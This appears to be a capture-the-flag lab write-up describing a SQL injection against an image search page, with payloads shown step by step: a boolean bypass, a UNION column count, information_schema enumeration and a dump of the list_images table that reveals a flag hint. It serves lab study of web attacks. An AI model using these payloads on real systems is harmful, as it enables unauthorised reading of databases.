in the search images page, we put 1 OR 1=1, we have successfully got the all imaages, so there is a sql injection here, we tried the payloads sql injection attack from here https://github.com/payloadbox/sql-injection-payload-list , when we tried the union attack with 5 UNION ALL SELECT 1,2, we got the number of rows which is 2, so we usd CONCAT with information.schecma by this command 5 UNION SELECT 1, CONCAT(table_name,1000001,column_name) FROM information_schema.columns, and we found that there is a table called list images, and it has id, url, title, and comment.

with this command we can see all of these information

5 UNION SELECT 1, CONCAT(id, url, title, comment) from list_images

and we got this 

ID: 5 UNION SELECT 1, CONCAT(id, url, title, comment) from list_images 
Title: 5borntosec.ddns.net/images.pngHack me ?If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : 1
